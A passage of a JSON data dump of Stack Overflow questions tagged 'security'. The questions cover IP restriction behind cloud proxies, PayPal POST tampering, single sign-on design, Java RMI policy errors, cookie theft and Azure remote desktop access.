to lock it down by ip so that only a number of IP ranges can access the application. I have used the Spring Security command within Config to achieve this:</p>\n\n<pre><code>grails.plugins.springsecurity.ipRestrictions\n</code></pre>\n\n<p>Then when running the App in the cloud (Jelastic) even though I am on one of the IP's I listed it doesn’t let me access the areas I want. I then put some code in the app shown below to pull back the address of the Client and it shows the address of maybe the cloud proxy server instead of the Client using the App:</p>\n\n<pre><code>request.getRemoteAddr()\n</code></pre>\n\n<p>I think that it wont let me access the areas I want as its reading my IP as the IP of the cloud proxy, I have also tried running the commands below to see if any of them return my actual IP, however they were all null :S</p>\n\n<pre><code>request.getHeader(\"X-Forwarded-For\");  \n\nrequest.getHeader(\"Proxy-Client-IP\");  \n\nrequest.getHeader(\"WL-Proxy-Client-IP\") \n\nrequest.getHeader(\"HTTP_CLIENT_IP\")\n\nrequest.getHeader(\"HTTP_X_FORWARDED_FOR\")\n</code></pre>\n\n<p>I just need to know if there is some way of restricting this application down in the cloud by Client IP instead of it using the IP of the Cloud Proxy? Thanks in advance</p>\n"},{"tags":[".net","security","networking","distributed-computing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13198282,"title":"Safely executing .NET code on remote clients","body":"<p>I have a couple of students working on a volunteer computing project. Although is a school project for them, once finished and correctly tested we will begin the implantation in our faculty for real use. The idea is to create a platform for general purpose distributed computing in out faculty's internal network. But we are just starting. </p>\n\n<p>The first problem we need to solve is this: using an already implemented distributed system with automatic discovery, replication, and the other characteristics such a system needs, we want to take a user's code in .NET and run it in this distributed system. Since is a volunteer system, we need to respect every node's settings for maximum available memory and CPU use, and run in a safe environment where the user's code has no access to the client's file system, can't raise new processes, etc.</p>\n\n<p>So, the general question is: what is the best way to proceed, regarding both the sharing of the code and the security. </p>\n\n<p>We have discussed a few ideas, that I present now for your evaluation and comments. Any suggestion is greatly appreciated. </p>\n\n<ul>\n<li>Somehow serialize a .NET delegate together with its closure.</li>\n<li>Force the user to implement some interface and then upload his assembly and dependencies, find an implementation of this interface, instantiate it and run it. Maybe add some attributes.</li>\n<li>Expose the distributed system inner workings and let the user deal with the creation and synchronization of his distributed tasks.</li>\n</ul>\n\n<p>I would prefer the most transparent solution, as close to the Task Parallel Library interface as possible.</p>\n\n<p>Thanks in advance. </p>\n"},{"tags":["security","encryption","paypal","e-commerce"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":229,"score":3,"question_id":3784015,"title":"Is this Paypal setup secure?","body":"<p>I just wanted to run this by other heads to make sure I wasn't missing something obvious. I am using Payflow Link, which handles all the credit card nastiness of ecommerce transactions. However, you pass the total amount of the transaction to PayPal over POST variables - which seems like a potential security hole:</p>\n\n<ol>\n<li>A malicious user could load up his cart and proceed to checkout</li>\n<li>By reading the hidden input fields, he could spoof the POST to PayPal with a total amount of 1 cent. </li>\n<li>Paypal would executes the transaction, calls my order logging script, which would log the transaction and mark his items for shipment.</li>\n</ol>\n\n<p>I could check total amount against his cart by accessing the database, pulling his cart items, and re-totaling their prices plus shipping and tax. But that is a lot of heavy lifting just to check for tampering (multiple DB queries, plus 2 web service calls per item to get shipping and tax).</p>\n\n<p>My idea:</p>\n\n<ol>\n<li>PayPal is sent the normal POST variables for the amount</li>\n<li>But then, in the user defined variables (which get forwarded to my logging script), store a sha1 hash of the total amount, plus some private key</li>\n<li>On the other side, the logging script rehashes the dollar amount, plus the same private key, and compares to the hash sent through.</li>\n<li>Differences between the sent hash and computed hash would indicate tampering, and the order would be red-flagged for human review.</li>\n</ol>\n\n<p>Does this make sense? Am I missing something?</p>\n\n<p><strong>edit (for clarification):</strong></p>\n\n<p>Apparently I wasn't making my point clear, based on the first several responses. I realize this isn't an ideal setup. I know other companies offer similar or possibly even better services. I know I have to check the variables and I can't simply trust them. Please, if you are going to reply, all I am looking for in an answer is this:</p>\n\n<h2>Can anyone demonstrate a single vulnerability with my proposal that would allow a malicious user to alter the PayPal variables and go undetected?</h2>\n\n<p>It is a very straightforward question. That is all I am looking for. To anyone who can answer that, thank you in advance for you time and help!</p>\n"},{"tags":["security","encryption","cryptography"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":30,"score":0,"question_id":13169135,"title":"CPA Secure Chosen plaintext scheme","body":"<p>The example for IND-CPA secure schemes given is generally:</p>\n\n<p>for a random r, </p>\n\n<blockquote>\n  <p>Enc_k(m) =(r|| E_k(r) XOR m) where E is a PRF</p>\n</blockquote>\n\n<p>But does the role of r and k really matter--i.e. isn't this equally secure? </p>\n\n<blockquote>\n  <p>Enc_k(m) =(r|| E_r(k) XOR m) ? </p>\n</blockquote>\n"},{"tags":["javascript","html","security","browser","text-editor"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13197212,"title":"Cut,Copy, paste not working in tiny mce editor","body":"<p>I have using tiny MCE editor to input the contents.If i want to cut, copy or paste any word it shows some error message like<br>\n   \"Copy/Cut/Paste is not available in Mozilla and Firefox.Do you want more information about this issue?\"</p>\n\n<p>or  \"Currently not supported by your browser, use keyboard shortcuts instead.\"..</p>\n\n<p>How can i fix this problem. any one help me.</p>\n\n<p>Thanks in advance..</p>\n"},{"tags":["c#",".net","security","zip","fips"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":298,"score":2,"question_id":8447367,"title":"FIPS 140-2 compliant .NET Zip Solution?","body":"<p>Other than Xceed, is there a Zip library for .NET that uses encryption algorithms that can be used in a FIPS 140-2 enabled environment?</p>\n\n<p>FYI I have read on DotNetZip but it uses WinZipAes, based on Rijndael which is not FIPS 140-2 compliant. Also I have checked Rebex but only their SFTP component is FIPS compliant.</p>\n\n<p>Edit: For the Zip solution I am looking for, the only FIPS requirement I have is that it uses compatible algorithms (such as CryptoServiceProvider or Cng classes in .NET).</p>\n"},{"tags":["php","security","authentication","single-sign-on"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":93,"score":3,"question_id":12813918,"title":"Single signon web-based authentication system","body":"<p>I'm hoping for feedback on an authentication system I have designed.</p>\n\n<p>The requirements are to create a closed, single sign on web environment, where by once one of our employees visit one of our web applications, they are asked to sign in with their credentials backed by our LDAP. Once signed in, they retain this login for a set time period, or the browser session, and across all our web applications. Much how Google's web properties work with a google account, but for our internal systems.</p>\n\n<p>The users themselves operate from windows, mac or linux, and some from just tablets, so this authentication environment needs to exist solely online, kerberos with mod_auth_kerb etc aren't going to cut it.</p>\n\n<p>All our current web applications use PHP.</p>\n\n<p>The system I have so far works like below.</p>\n\n<p>There exists one central authentication system, which I will call the Authentication Handler, or \"handler\" for short, and one or more authentication \"client\" web apps, which I will call Authentication Requestor, or \"requestor\" for short. I will call the user and their browser just \"user\".</p>\n\n<p>Also, for it to work, the requestor needs to be preconfigured at the handler with a unique <code>requestor_id</code> and return URL for that ID.\nA private key for handler is generated and a public key given to all requestors before hand too.</p>\n\n<h2>user visits requestor</h2>\n\n<ol>\n<li>user enters URL for requestor.</li>\n<li>no session exists for this user on requestor, so requestor creates a new <code>SESSION_ID</code> in PHP (with the built in session handler and <code>session_start</code>).</li>\n<li>the session has no authentication, so requestor will then generate a URL to the configured handler consisting of two parts, an <code>authrequest</code> token and an <code>envelope</code>.\n<ol>\n<li>requestor first regenerate a new session_id (<code>session_regenerate_id</code> in PHP) for this auth request for the client. </li>\n<li>requestor then generates a random password, in this case using PHP's <code>openssl_random_pseudo_bytes</code> and stores this in the session data</li>\n<li>requestor then encrypts the <code>SESSION_ID</code> using <code>AES256</code> with the random password for the <code>authrequest</code> in PHP using <code>openssl_encrypt</code>.</li>\n<li>requestor then generates envelope data by concatenating it's unique <code>requestor_id</code>, a ':', and the base64-encoded random password.</li>\n<li>requestor's envelope data is then encrypted using the pre-shared public key for the handler using <code>openssl_public_encrypt</code> in PHP.</li>\n</ol></li>\n<li>requestor then sends a <code>location:</code> header to user that contains the encrypted <code>envelope</code> and the <code>authrequest</code> as URL parameters to handler.</li>\n<li>handler will decrypt the envelope using it's private key, and separate the clientID and password.</li>\n<li>handler will check the <code>requestor_id</code> to see if we have this configured, if not, will inform the user that the requestor was not recognised.</li>\n<li>handler will authenticate the user (in this case, via asking for username and password and checking against LDAP and/or via a preauthenticated session)</li>\n<li>handler will then generate a return <code>authtoken</code> to requestor\n<ol>\n<li>handler will decrypt the <code>SESSION_ID</code> from <code>authrequest</code> using the decrypted and decoded password from the envelope</li>\n<li>handler will encrypt a new string containing <code>SESSION_ID</code> and an ID of the logged in credentials (username, GUID, etc) with the decrypted and decoded password from the envelope</li>\n</ol></li>\n<li>handler then sends a <code>location:</code> header to user that contains the <code>authtoken</code> as URL parameter to a preconfigured URL for this <code>requestor_id</code>.</li>\n<li>requestor receives the request, and will decrypt the token using the password in the users session.</li>\n<li>requestor will confirm the <code>SESSION_ID</code> matches the users current session, else it will restart authentication.</li>\n<li>requestor can then use the returned crednetialID to identify a local user as authenticated.</li>\n</ol>\n\n<p>This process can be repeated across different systems to give a single signon behaviour.</p>\n\n<p>So, questions:</p>\n\n<ol>\n<li>Does anyone know of a pre-existing, standardised authentication system that meets the requirements and preforms similarly to above?</li>\n<li>If not, and given that I'm no security expert, is there anything above that would could be broken? i.e. what is/are the weak point(s) of this method?</li>\n</ol>\n"},{"tags":["java","security","rmi","unmarshalling","accesscontrolexception"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":4025,"score":1,"question_id":1666028,"title":"Java RMI (Server: TCP Connection Idle/Client: Unmarshalexception (EOFException))","body":"<p>I'm trying to implement Sun Tutorials RMI application that calculates Pi. I'm having some serious problems and I cant find the solution eventhough I've been searching the entire web and several javaskilled people.\nI'm hoping you can put an end to my frustrations.</p>\n\n<p>The crazy thing is that I can run the application from the cmd on my desktop computer. Trying the exact same thing with the exact same code in the exact same directories on my laptop produces the following errors. The problem occures when I try to connect the client to the server.</p>\n\n<p>I don't believe that the error is due to my policyfile as I can run it on the desktop. It must be elsewhere. Have anyone tried the same and can you give me a hint as to where my problem is, please?</p>\n\n<p><hr /></p>\n\n<p>POLICYFILE SERVER:\ngrant\n{\n    permission java.security.AllPermissions;\n    permission java.net.SocketPermission\"*\", \"connect, resolve\";\n};</p>\n\n<p>POLICYFILE CLIENT:\ngrant\n{\n    permission java.security.AllPermissions;\n    permission java.net.SocketPermission\"*\", \"connect, resolve\";</p>\n\n<p>};\n<hr /></p>\n\n<p>SERVERSIDE ERRORS:\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.</p>\n\n<p>C:\\Documents and Settings\\STUDENT>cd\\</p>\n\n<p>C:>start rmiregistry</p>\n\n<p>C:>java -cp c:\\java;c:\\java\\compute.jar -Djava.rmi.server.codebase=file:/c:/jav\na/compute.jar -Djava.rmi.server.hostname=localhost -Djava.security.policy=c:/jav\na/servertest.policy engine.ComputeEngine\nComputeEngine bound</p>\n\n<p>Exception in thread \"RMI TCP Connection(idle)\" java.security.AccessControlExcept\nion: access denied (java.net.SocketPermission 127.0.0.1:1440 accept,resolve)\n        at java.security.AccessControlContext.checkPermission(Unknown Source)\n        at java.security.AccessController.checkPermission(Unknown Source)\n        at java.lang.SecurityManager.checkPermission(Unknown Source)\n        at java.lang.SecurityManager.checkAccept(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.checkAcceptPermi\nssion(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport.checkAcceptPermission(Unknown Sour\nce)\n        at sun.rmi.transport.Transport$1.run(Unknown Source)\n        at java.security.AccessController.doPrivileged(Native Method)\n        at sun.rmi.transport.Transport.serviceCall(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport.handleMessages(Unknown Source)\n        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(Unknown Sou\nrce)\n        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(Unknown Sour\nce)\n        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source\n)\n        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)\n        at java.lang.Thread.run(Unknown Source)</p>\n\n<p><hr /></p>\n\n<p>CLIENTSIDE ERRORS:\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.</p>\n\n<p>C:\\Documents and Settings\\STUDENT>cd\\</p>\n\n<p>C:>java -cp c:\\java;c:\\java\\compute.jar -Djava.rmi.server.codebase=file:\\C:\\jav\na\\files\\ -Djava.security.policy=c:/java/clienttest.policy client.ComputePi local\nhost 45</p>\n\n<p>ComputePi exception:\njava.rmi.UnmarshalException: Error unmarshaling return header; nested exception\nis:\n        java.io.EOFException\n        at sun.rmi.transport.StreamRemoteCall.executeCall(Unknown Source)\n        at sun.rmi.server.UnicastRef.invoke(Unknown Source)\n        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(Unkn\nown Source)\n        at java.rmi.server.RemoteObjectInvocationHandler.invoke(Unknown Source)\n        at $Proxy0.executeTask(Unknown Source)\n        at client.ComputePi.main(ComputePi.java:18)\nCaused by: java.io.EOFException\n        at java.io.DataInputStream.readByte(Unknown Source)\n        ... 6 more</p>\n\n<p>C:></p>\n\n<p><hr /></p>\n\n<p>Thanks in advance\nPerry</p>\n"},{"tags":["security","hash","cryptography"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":40,"score":-3,"question_id":13189235,"title":"What is the maximum input length of MD5 function?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3394503/maximum-length-for-md5-input-output\">Maximum length for MD5 input/output</a>  </p>\n</blockquote>\n\n\n\n<p>I know that MD5 function produces a maximum length of 32 bytes, but what about its maximum input?</p>\n"},{"tags":["git","security","audit","repo"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13193970,"title":"Git commit auditing","body":"<p>I have a git server running over ssh and each user has a unix account on the system.</p>\n\n<p>Given that two users have access to a repo, how can I be sure which user performed which commit, since the commit user name and email is submitted and controlled by the git client.</p>\n\n<p>I am concerned that a user might try to impersonate another, even if they have the same authorization rights.</p>\n"},{"tags":["html","security","iis","post","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13193691,"title":"Server does allow GET method but doesn't allow POST","body":"<p>I have a simple static html site which uses jquery's POST-methods and some forms which also uses form method=\"post\"...</p>\n\n<p>i now get the following error: NetworkError: 405 Method Not Allowed</p>\n\n<p>when i view the response header with firebug i see that the server (IIS btw.) does allow the following:\nGET, HEAD, OPTIONS, TRACE</p>\n\n<p>My hoster says that he can't allow POST methods on static html files because of security reasons... </p>\n\n<p>Can anyone tell me the security differences between POST and GET? I don't understand why GET is allowed and POST not. any help to argue that he can allow it would be very appreciated :-)</p>\n\n<p>Thanks in advance\nThomas </p>\n"},{"tags":["c#","wcf","security","iis","http-basic-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13176143,"title":"WCF in IIS, http basic authentication - Windows User \"security\" implications","body":"<p>I created a WCF Service, using http Basic Authentication and SSL. (Temporary certificate in IIS atm)</p>\n\n<p>Here is the relevant configuration.</p>\n\n<pre><code>&lt;services&gt;\n  &lt;service name=\"MyNamespace.MyService\"&gt;\n    &lt;endpoint address=\"\" binding=\"basicHttpBinding\" bindingConfiguration=\"basicHttps\"\n      name=\"MyEndPoint\" contract=\"MyNamespace.IMyService\" /&gt;\n  &lt;/service&gt;\n&lt;/services&gt;\n&lt;behaviors&gt;\n  &lt;serviceBehaviors&gt;\n    &lt;behavior name=\"\"&gt;\n      &lt;!-- These will be false when deployed --&gt;\n      &lt;serviceMetadata httpsGetEnabled=\"true\" /&gt;\n      &lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n    &lt;/behavior&gt;\n    &lt;!-- This doesn't do anything in IIS --&gt;\n    &lt;behavior name=\"CustomUsernameValidatorBehavior\"&gt;\n      &lt;serviceCredentials&gt;\n        &lt;userNameAuthentication userNamePasswordValidationMode=\"Custom\"\n          customUserNamePasswordValidatorType=\"MyNamespace.CustomUserNameValidator\" /&gt;\n      &lt;/serviceCredentials&gt;\n    &lt;/behavior&gt;\n  &lt;/serviceBehaviors&gt;\n&lt;/behaviors&gt;\n&lt;bindings&gt;\n  &lt;basicHttpBinding&gt;\n    &lt;binding name=\"basicHttps\"&gt;\n      &lt;security mode=\"Transport\"&gt;\n        &lt;transport clientCredentialType=\"Basic\" /&gt;\n      &lt;/security&gt;\n    &lt;/binding&gt;\n  &lt;/basicHttpBinding&gt;\n&lt;/bindings&gt;\n</code></pre>\n\n<p>Due to the fact I am hosting in IIS, I can't use my customUsernameValidator, and IIS Basic authentication tries the username and password against Windows. </p>\n\n<p>I created a new user, disabled logon locally, and put it in a new group (without rights). The <strong>only</strong> purpose of the user is to ensure they are allowed to access the service, nothing else. The service will be online, not internal e.g. in an Intranet etc.</p>\n\n<p>My question boils down to this, is there security risks/implications due to the fact I am using a real windows user? What can be done to secure this service/IIS if so?</p>\n\n<p>Should something be done to prevent 'phishing' of information, could they for example try different usernames and passwords to find credentials?</p>\n\n<p><em>Btw this is a working binding (minus some other endpoints etc.) for WCF using Http Basic Authentication in IIS and SSL. It requires IIS has Basic Authentication installed, as well as a Windows User to authenticate against. I would prefer not to authenticate against a Windows user.</em></p>\n"},{"tags":["security","pdf"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":356,"score":2,"question_id":1074932,"title":"PDF Security","body":"<p>I have a question about PDF security preferences. Can I change an editable pdf to readable pdf programmatically?</p>\n"},{"tags":["flash","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":9,"score":0,"question_id":13192479,"title":"What is the right way to change cookies/custom data stored by Flash?","body":"<p>Where Shockwave Flash data stored and how to change specific data stored by Flash player while using browser?</p>\n"},{"tags":["security","ssl","iis7","x509","certificates"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":14,"score":1,"question_id":13192472,"title":"IIS 7 X509 Certificate Issue","body":"<p>I am building a site that needs to call a 3rd party web service over https. The service requires an X509 certificate for authentication.</p>\n\n<p>I can successfully call the service and get a response back using a console application, or a web application running in visual studio web server, this suggests to me that the code, and certificate provided by the 3rd party are all ok.</p>\n\n<p>As soon as I deploy the site in IIS, it cannot connect to the service, I am getting \"The request was aborted: Could not create SSL/TLS secure channel\" error. I spent a couple of hours trying to figure this out, assuming it was permissions related as IIS app pool running under network service etc. </p>\n\n<p>The certificate is installed in the local machine store, not current user, and I have granted network service (also added everyone is desperation!) using the winhttpcertcfg tool and manually in MMC > Manage Private Keys, so I am confident that the network service account has access to the certificate. </p>\n\n<p>I also used the FindPrivateKey tool and checked the physical windows file and permissions look ok! I tried using identity impersonate in the config, using my windows account and that doesn't make a difference.</p>\n\n<p>I am pulling my hair out with this one, can anyone give me any suggestions on what to try next?</p>\n\n<p>Cheers</p>\n"},{"tags":["java","security","file-io","file-permissions","accesscontrolexception"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2716,"score":3,"question_id":10454037,"title":"java.security.AccessControlException: Access denied (java.io.FilePermission","body":"<pre><code>final File parentDir = new File(\"S:\\\\PDSPopulatingProgram\");\nparentDir.mkdir();\nfinal String hash = \"popupateData\";\nfinal String fileName = hash + \".txt\";\nfinal File file = new File(parentDir, fileName);\nfile.createNewFile(); // Creates file PDSPopulatingProgram/popupateData.txt\n</code></pre>\n\n<p>I am trying to create a file in a folder but I am getting exception as </p>\n\n<pre><code>java.security.AccessControlException: Access denied\n</code></pre>\n\n<p>I am working in windows environment.  I can create a folder from the Windows Explorer, but not from the Java Code. </p>\n\n<p>How can I resolve this issue? </p>\n"},{"tags":["facebook","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":31,"score":-3,"question_id":13191868,"title":"To confirm that this is your account, please enter your date of birth","body":"<p>I appreciate if you could help me . I got a message when I am signing in my facebook :\nYour account is temporarily locked.\nSecurity Check\nTo confirm that this is your account, please enter your date of birth.</p>\n\n<p>Unfortunately , I don’t remember the date of birth I entered .</p>\n\n<p>Please help me .</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["ruby-on-rails-3","security","devise","cancan","rails-admin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13179927,"title":"CanCan and Boolean User Authorization - Security Risk?","body":"<p>For using Multiple \"roles\" on Users in rails_admin CanCan seems to be a great choice. So I added a Boolean Attribute \"admin\" to the User-Model and tell CanCan to allow access to rails_admin only if this is present. </p>\n\n<p>But isn't this a security issue? How can I be sure, that nobody is able to change the attribute?</p>\n"},{"tags":["security","node.js","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13189508,"title":"How to save the confidential data at server side","body":"<p>I create a web server with Node.js. The database is MongoDB. I'm using a json file to save the server configuration. The node module 'nconf' is used to read the json file. </p>\n\n<p>Currently, all the data, including some confidential data, saved in the json file is plain text. I don't think it is security enough. What should I do to make sure the confidential data is security?</p>\n"},{"tags":["android","iphone","security","api"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13188202,"title":"Best Practice for iphone app-server API security","body":"<p>I am making an app for iPhone (and android) that will have interaction with a RESTful server that does most of the heavy lifting. </p>\n\n<p>(At this point its just a messaging app so messages and profile data getting sent back and forth so little personal information.)</p>\n\n<p>What are the best practices for security for such an API:\nSome things that come to mind are</p>\n\n<ul>\n<li>doing everything over HTTPS</li>\n<li>getting a token from the server (and then possibly hashing it with a salt) and returning it with requests.</li>\n<li>Blowfish encoding the whole payload. </li>\n<li>Hashing the payload with a salt and adding that as a parameter. </li>\n</ul>\n\n<p>What sort of level of security is appropriate?</p>\n"},{"tags":["security","configuration","policy","lotus"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13188751,"title":"set lotus notes traveler security policy by device type","body":"<p>I'm having problem setting up Lotus Notes Traveler to support custom devices type. From the screenshot below, it seems lotus notes traveler only support custom security policy for known device types, either Windows, Nokia, Andorid or Apple. For device type out of the four, the default policy will be used.</p>\n\n<p><img src=\"http://i.stack.imgur.com/eEpN1.png\" alt=\"Security settings\"></p>\n\n<p>My question is, is it possible to assign a custom security policy for device type like 'my_super_app'?</p>\n"},{"tags":["security","cookies"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":54,"score":4,"question_id":13186550,"title":"Stealing \"remember me\" cookies a valid threat?","body":"<p>I'm using SSL to transmit all data. HTTP is completely disabled. Short of malware, or accessing someones physical machine (both of which are very hard to prevent from server side), I don't see how an attacker could steal a login cookie.</p>\n\n<p>Thus, is it okay to not worry about stealing a login cookie?</p>\n\n<p>The complexity to properly implement a non-stealable login cookie, that still allows users to have sessions across different browsers and different machines is higher than the material it's safe-guarding.</p>\n\n<p>Thus, I believe it's okay to not safe guard against copy and pasting cookie data from machine to machine.</p>\n\n<p>Is this a valid trade off, or am I forgetting something critical here.</p>\n"},{"tags":["php","security","spam","error-log"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13185171,"title":"An unfamiliar entry in my error log??? Anyone know have an idea what it is/means?","body":"<p>I just check my server's error log to see if it would give me any hints about why a script I'm writing isn't looping over all the elements in it.</p>\n\n<p>Instead I found this single entry:</p>\n\n<blockquote>\n  <p>[Thu Nov 01 12:58:31 2012] [error] [client 108.174.61.133] client denied by server configuration: /home/myusername/public_html/application/mform id=, referer: <a href=\"http://g2m21:temppass@mysitename.co/login/return_url/64-L2Jsb2dzLzc1LzM0L3Jldmlld3Mtb24tZmxleC1iZWx0\" rel=\"nofollow\">http://g2m21:temppass@mysitename.co/login/return_url/64-L2Jsb2dzLzc1LzM0L3Jldmlld3Mtb24tZmxleC1iZWx0</a></p>\n</blockquote>\n\n<p>I've never seen an error like this &amp; due to the number of spammers/spambots that are always trying to post bogus blogs; I wonder if this is due to some sort of attempted hack/security threat.</p>\n"},{"tags":["python","security","api","password-protection","fabric"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":45,"score":3,"question_id":13178691,"title":"How does python fabric protect ssh credentials?","body":"<p>So I've recently stumbled upon python fabric api and have been really happy with how it can help me with day-to-day sysadmin tasks. I would like to start using it at work but it is a very security-conscious environment. I was wondering how fabric handles the ssh password you provide to it while it runs it's tasks? I'm assuming it plonks it in memory somewhere and pulls it out when required to login to the next host in <code>env.hosts</code>? How does it protect this password while in memory?</p>\n\n<p>I can see I'm going to be asked lots of questions along these lines so I'm looking for a nice way to explain to security-minded type of people that fabric is nice and friendly and doesn't pose a risk or at least no more of a risk than anything else we already have :)</p>\n"},{"tags":["security","iframe","cookies"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3743,"score":3,"question_id":2117248,"title":"Setting cookie in iframe - different Domain","body":"<p>we have our site integrated as an iframe into another site that runs on a different domain. It seems that we cannot set cookies. Has anybody encountered this issue before? Any ideas?</p>\n\n<p>Thanks\nHolger</p>\n"},{"tags":["c#",".net","asp.net-mvc","security","active-directory"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":98,"score":3,"question_id":13147132,"title":"Active Directory Group Membership Checking in .Net 4.5","body":"<p>I have an ASP.Net MVC application using Windows Authentication, and I am checking group membership for security on controller actions. </p>\n\n<p>Simple as it sounds, I've found no other Question that can resolve the problem I am experiencing.</p>\n\n<h3>First Attempt: [Authorize]</h3>\n\n<p>The classic method is to simply slap an <code>Authorize</code> data annotation attribute on the controller action and go to town:</p>\n\n<pre><code>[Authorize(Roles = @\"domain\\groupName1\")]\n</code></pre>\n\n<p>No dice. I am prompted for credentials. Usually this means something is wrong with the Windows Authentication configuration but it's setup fine: (1) <code>HttpContext.User</code> is a <code>WindowsPrincipal</code> object, and (2) I confirmed another known group name works.</p>\n\n<h3>Second Attempt: IsInRole()</h3>\n\n<p>The next step taken was to go a more old fashioned route and use <code>IPrincipal.IsInRole()</code>, and again, one returns <code>false</code>, the other <code>true</code>.</p>\n\n<pre><code>var wp = (WindowsPrincipal)User;\n\n// false\nvar inGroup1 = wp.IsInRole(@\"domain\\groupName1\");\n// true\nvar inGroup2 = wp.IsInRole(@\"domain\\groupName2\");\n</code></pre>\n\n<p>Stumped... so I hit up my systems nerds and we double check everything. User is a group member? Yes. Group name is spelled correctly? Yes. The next step was to snag the SID.</p>\n\n<h3>Third Attempt: Search Identity's Group Collection</h3>\n\n<p>In my controller I check the <code>WindowsIdentity</code> and look through the group collection for the SID of the troublesome group:</p>\n\n<pre><code>var wi = (WindowsIdentity)wp.Identity;\nvar group = wi.Groups.SingleOrDefault(g =&gt; g.Value == \"group1-sidValue\");\n</code></pre>\n\n<p>The <code>group</code> variable is the <code>SecurityIdentifier</code> object. Because it is not null, we can be certain that this current user is a member of the group that both the <code>[Authorize()]</code> or <code>IsInRole()</code> attempts fail to confirm.</p>\n\n<h3>Fourth Attempt: DirectoryServices.AccountManagement</h3>\n\n<p>At this point, I'm going nuts and add reference to the AccountManagement APIs. I search the domain context for the <code>GroupPrincipal</code> by both name and SID:</p>\n\n<p>var pc = new PrincipalContext(ContextType.Domain, \"domain\");\n   var gp1byName = GroupPrincipal.FindByIdentity(pc, \"groupName1\")\n   var gp1bySid = GroupPrincipal.FindByIdentity(pc, IdentityType.Sid, \"group1-sidValue\");</p>\n\n<p>Both group principal variables are ripe with the same object, and I verified through a watch variable that the principal's <code>Members</code> collection contains a <code>UserPrincipal</code> object with the same SID as the current <code>WindowsPrincipal</code> on <code>HttpContext</code>.</p>\n\n<h3>Question:</h3>\n\n<p>What in the hell have I missed here? Why would both role checking methodologies fail when it is plain and clear through object exploration that the user is a valid member of this given group? </p>\n\n<p>The fact that one group checks fine and the other does not seems the most strange part at this point.</p>\n\n<p>Please help.</p>\n"},{"tags":["security","azure","remote-desktop","azure-web-roles"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13182706,"title":"How to secure remote desktop access to windows azure instances","body":"<p>I've successfully <a href=\"http://msdn.microsoft.com/en-gb/library/windowsazure/gg443832.aspx\" rel=\"nofollow\">enabled Remote Desktop access</a> to my Windows Azure Web role, but ideally I'd like to lock down access so it's not only protected by a password. Is this possible? For example, restrict RDP access to specific IP ranges, require a client certificate, etc.</p>\n\n<p>I realise that you're advised not to enable Remote Desktop at all times but rather only enable it for troubleshooting. But if it's enabled for troubleshooting the security problem still remains. (Also seems annoying that you can't enable/disable RDP access without republishing, unless I'm missing something).</p>\n\n<p>thanks</p>\n"},{"tags":["php","html","security","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13182682,"title":"PHP Security - Combining functionality of strip_tags(); & htmlspecialchars();","body":"<p>I want my forum users to be able to insert links and other allowed tags. For example I would like the following HTML in a post to display as the writer intended (i.e. as a functioning link): </p>\n\n<pre><code>&lt;a href=\"http://www.example.com\" rel=\"nofollow\"&gt;A page&lt;/a&gt;\n</code></pre>\n\n<p>However, I want to maintain some level of security and have been reading up on <a href=\"http://php.net/manual/en/function.strip-tags.php\" rel=\"nofollow\">strip_tags</a>() and <a 